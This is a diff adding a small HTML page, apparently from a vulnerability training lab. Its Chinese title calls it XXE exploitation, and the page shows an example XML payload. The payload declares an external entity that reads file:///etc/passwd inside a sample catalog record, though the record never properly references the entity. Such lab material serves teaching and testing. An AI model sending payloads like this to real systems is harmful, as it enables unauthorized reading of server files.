@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <link rel="shortcut icon" href="img/php_logo.jpg.png" type="image/x-icon">
+
+    <title>XXE漏洞利用</title>
+
+    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
+    <meta name="viewport" content="width=device-width" />
+
+    <link rel="stylesheet" type="text/css" href="css/font.css" />
+    <link href="css/bootstrap.min.css" rel="stylesheet" />
+    <link href="css/material-bootstrap-wizard.css" rel="stylesheet" />
+</head>
+<body>
+利用代码如下：<br><br>
+<span>
+    <textarea><?xml version="1.0"?>
+        <!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<catalog>
+   <core id="test101">
+      <author>qdsw</author>
+      <title>xxe</title>
+      <category>11</category>
+      <price>9.99</price>
+      <date>2020-10-01</date>
+      <description>xxe;</description>
+   </core>
+</catalog></textarea>
+ </span>
+</body>
+</html>
